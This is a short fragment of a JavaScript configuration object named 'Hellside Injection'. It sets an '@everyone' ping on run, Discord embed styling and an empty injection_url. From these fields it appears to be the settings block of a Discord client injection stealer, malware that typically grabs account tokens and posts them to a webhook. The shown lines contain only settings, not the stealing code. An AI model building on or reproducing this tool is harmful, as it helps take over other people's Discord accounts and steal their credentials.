...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Hellside Injection', 
  embed_icon: 'https://media.discordapp.net/attachments/1103785581005258852/1103865424426303528/discord-avatar-512-Y8VYZ.png'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: '', 
  /**
